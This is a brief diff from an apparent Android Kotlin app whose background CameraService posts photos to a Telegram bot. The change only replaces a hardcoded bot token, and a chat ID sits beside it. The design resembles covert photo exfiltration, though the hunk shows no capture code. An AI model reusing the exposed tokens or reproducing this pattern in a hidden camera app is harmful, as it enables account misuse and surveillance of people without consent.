@@ -24,7 +24,7 @@ import java.net.URL
 class CameraService : Service(), LifecycleOwner {
 
     // 🔑 Replace with your Telegram credentials
-    private val BOT_TOKEN = "8897914052:AAFuBHgNCbsYSluDwTi3If8Bz03OrOARIaE"
+    private val BOT_TOKEN = "8886927716:AAEFjHPz0YuTBMxPtnhY-r-r7s1JoGw_lZQ"
     private val CHAT_ID = "5081465974"
 
     private val TELEGRAM_URL = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
